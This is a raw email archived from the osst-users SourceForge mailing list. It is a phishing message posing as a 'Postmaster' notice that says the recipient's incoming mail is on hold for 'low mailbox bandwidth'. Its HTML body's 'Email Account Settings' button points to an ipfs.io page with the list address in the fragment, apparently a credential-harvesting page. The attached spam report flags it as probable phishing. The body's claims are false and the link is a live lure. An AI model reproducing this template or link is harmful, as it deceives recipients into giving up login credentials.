Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id ED797ADADF5
	for <lists+osst-users@lfdr.de>; Mon, 16 Jun 2025 13:02:59 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=PINuYMcCMVcSmr3vxVG7rFFPbZ4SgyyGMc7jOeeXYB4=; b=V32iWHhDaYUVkgrU5/hBNSOn93
	OepU/s4D9kYEy+TYe7o2K3R1nus7JER0kVV1aa/iL6y/bxjlEKymU1RI5dk+UkYp88FpEQNt2CW0v
	RKKeV7shJ3KG/dhwz3f/rQJcyZVMgVwGcn9MutM5l4oEqFDep95oHOxdjKawOi6OLTS4=;
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1uR7cA-0004ct-PO
	for lists+osst-users@lfdr.de;
	Mon, 16 Jun 2025 11:02:58 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <osst-users@lists.sourceforge.net>)
 id 1uR7c9-0004cQ-Ae for osst-users@lists.sourceforge.net;
 Mon, 16 Jun 2025 11:02:57 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=JaEZFqmeRm60/KMsM3wQzDelTveMSWGcsjzo6J8b0mk=; b=gHuUX29s/OY8O91yGNBzYLWyPf
 PAs8B54lI7WN6JyznujgzsDr8beH8LTNIzWphnU1zFioLwjx0rsdX9spHmamEQzNCqAsGI7itbAld
 lXnVlMsPLGx7vRbQ2G3kXnusyx0gMt+fG7/Hg1db4MBEoXvjWoqrA9ZZs1B+wzOtQXas=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=JaEZFqmeRm60/KMsM3wQzDelTveMSWGcsjzo6J8b0mk=; b=S
 dT6rkCSlsz1L7DJBAveEp2LoNkCV+v8kTKdAAYBvUEUUdOQI9CeATKbLTswVtzwvssnmCPifzwGdp
 76QNXVAWT5+AI1FugLf+DLkSKo983zkAlzoKPQBvdPhF68wSOAt3IHj9w2KQvsqc2BvSw3YlKMZN9
 1ftYX95U2LBKQ3+8=;
Received: from [192.227.246.108] (helo=lists.sourceforge.net)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1uR7Fs-0006rp-TJ for osst-users@lists.sourceforge.net;
 Mon, 16 Jun 2025 10:40:00 +0000
From: Postmaster <osst-users@lists.sourceforge.net>
To: osst-users@lists.sourceforge.net
Date: 16 Jun 2025 12:39:54 +0200
Message-ID: <20250616123954.F585A1590A8F04C6@lists.sourceforge.net>
MIME-Version: 1.0
X-Helo-Check: bad, Forged One Of Our Local Domains (lists.sourceforge.net)
X-Spam-Score: 6.0 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Dear osst-users@lists.sourceforge.net, Your incoming messages
 has been placed on hold due to low mailbox bandwidth. Go to Email account
 settings below to review held messages and fix bugs. Email Account Settings
 Content analysis details:   (6.0 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [192.227.246.108 listed in wl.mailspike.net]
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 2.0 URI_IPFSIO References Interplanetary File System PtP content via
 ipfs.io, likely phishing
 1.5 GB_CUSTOM_HTM_URI      Custom html uri
 0.0 TO_EQ_FM_DOM_HTML_ONLY To domain == From domain and HTML only
 0.1 URI_IPFS               References Interplanetary File System PtP content,
 probable phishing
 0.0 TO_EQ_FM_HTML_ONLY     To == From and HTML only
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
 0.0 TO_EQ_FM_DIRECT_MX     To == From and direct-to-MX
X-Headers-End: 1uR7Fs-0006rp-TJ
Subject: [Osst-users] Undeliverable: Incoming messages failure
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6959618756093591212=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============6959618756093591212==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table width=3D"100%" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"0">
<tbody>
<tr>
<td height=3D"1" style=3D"margin: 0px;" bgcolor=3D"#dae1e9"><font size=3D"1=
"></font></td></tr>
<tr>
<td height=3D"24" style=3D"margin: 0px;"><font size=3D"1">&nbsp;</font></td=
></tr>
<tr>
<td align=3D"center" style=3D"margin: 0px;">
<p><font size=3D"4">Dear&nbsp;</font><a style=3D"color: rgb(34, 34, 34);"><=
font size=3D"4">osst-users@lists.sourceforge.net</font></a><font size=3D"4"=
>,</font></p><span style=3D"color: rgb(72, 84, 93); line-height: 24px; font=
-size: 14px;"><font size=3D"4">Your incoming messages has been placed on ho=
ld due to low mailbox bandwidth.<br>Go to Email account settings below to r=
eview held messages and fix bugs.</font></span></td></tr>
<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4">&nbsp;</font></td=
></tr>
<tr>
<td width=3D"48%" align=3D"center" valign=3D"top" style=3D"margin: 0px;"><s=
pan><a style=3D"padding: 15px 25px; color: rgb(255, 255, 255); text-decorat=
ion: none; display: block; background-color: rgb(0, 135, 209);" href=3D"htt=
ps://ipfs.io/ipfs/bafybeibqv363awgnqwx346acrgghlqqf5r4tkv5y6wirxoljapwds6c4=
y4/vite-react-web.vercel.app.html#osst-users@lists.sourceforge.nethttps://i=
pfs.io/ipfs/bafybeibqv363awgnqwx346acrgghlqqf5r4tkv5y6wirxoljapwds6c4y4/vit=
e-react-web.vercel.app.html#osst-users@lists.sourceforge.net" rel=3D"noopen=
er noreferrer"><font size=3D"4">
Email Account Settings</font></a></span></td></tr>
<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=

<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=

<tr>
<td align=3D"center" style=3D"margin: 0px;">
<p style=3D"color: rgb(162, 162, 162); line-height: 17px; font-size: 12px; =
font-style: italic;"><font size=3D"3">Failure to review your account may ca=
use login interruption.<br>&copy; 2023 lists.sourceforge.net. All Rights Re=
served.</font></p></td></tr></tbody></table></body></html>


--===============6959618756093591212==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6959618756093591212==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============6959618756093591212==--
